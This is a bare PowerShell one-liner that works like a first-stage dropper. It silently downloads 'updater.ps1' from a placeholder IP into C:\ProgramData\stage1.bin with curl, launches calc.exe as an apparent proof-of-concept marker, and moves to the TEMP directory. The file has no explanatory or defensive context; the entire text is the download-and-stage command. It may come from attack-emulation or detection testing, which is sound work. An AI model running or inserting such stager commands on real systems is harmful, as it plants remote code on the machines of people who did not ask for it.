
$RemoteUrl = "https://198.51.100.166:443/updater.ps1"; $DropPath = 'C:\ProgramData\stage1.bin'; curl.exe -s -L -o $DropPath $RemoteUrl; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
